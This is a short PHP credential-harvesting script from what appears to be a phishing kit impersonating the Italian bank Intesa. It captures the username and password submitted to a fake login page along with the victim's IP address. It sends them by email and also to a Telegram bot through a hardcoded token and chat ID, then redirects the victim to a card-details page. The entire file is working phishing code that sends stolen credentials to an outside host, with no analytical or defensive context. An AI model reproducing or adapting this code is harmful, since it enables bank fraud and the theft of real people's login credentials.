<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['user']) &&  !empty($_POST['Pass'])){
$message  = "=========[BILLING INFO]=========\n";
$message .= "User  : ".$_POST['user']."\n";
$message .= "Pass  : ".$_POST['Pass']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BILLING INFO]=========";
$to="gcs.com";
$subject = "LOGIN INTESA [$ip]";
$headers = "From: LOGIN INTESA <bladsadsada@web.de>";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message,$headers);
		    $token = "8712281940:AAEWCDV_cL71xPIy_qXaLH6UzgQvKOhq0Jk";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-1003366306499&text=" . urlencode($message)."" );
header("Location:../Kaart.php");
}else{
header("Location:../index.php");
}

?>